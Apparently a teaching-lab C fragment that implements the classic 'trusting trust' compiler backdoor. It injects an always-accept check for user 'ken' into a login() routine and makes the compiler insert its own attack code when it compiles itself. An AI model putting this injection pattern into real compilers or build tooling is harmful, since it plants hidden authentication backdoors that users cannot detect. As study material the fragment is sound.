
/*****************************************************************
 * Step 1:
 */

// match on the start of the login() routine:
static char login_sig[] = "int login(char *user) {";

// and inject an attack for "ken":
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

char* login_loc = strstr(program, login_sig);
if (login_loc != NULL) {
    // Move pointer to end of function signature
    int login_idx = login_loc - program + strlen(login_sig); 
    char* buf = malloc(strlen(program) + 4096);
    strncpy(buf, program, login_idx);
    buf[login_idx] = '\0';
    strcat(buf, login_attack);
    strcat(buf, program + login_idx);
    program = buf;
}

/*****************************************************************
 * Step 2:
 */

// search for the start of the compile routine: 
static char compile_sig[] =
        "static void compile(char *program, char *outname) {\n"
        "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
        "    assert(fp);\n"
        ;

// and inject a placeholder "attack":
// inject this after the assert above after the call to fopen.
// not much of an attack.   this is just a quick placeholder.
// static char compile_attack[] 
//           = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";

char* compile_loc = strstr(program, compile_sig);
if (compile_loc != NULL) {
    // Move pointer to end of function signature
    int compile_idx = compile_loc - program + strlen(compile_sig); 
    char* buf = malloc(strlen(program) + 20000);
    strncpy(buf, program, compile_idx);
    buf[compile_idx] = '\0';
    strcat(buf, "\nchar prog[] = {\n");
    for(int i = 0; i < sizeof(prog); i++) {
        char line[10];
        sprintf(line, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
        strcat(buf, line);
    }
    strcat(buf, "0 };\n");
    strcat(buf, prog);
    strcat(buf, program + compile_idx);
    program = buf;
}


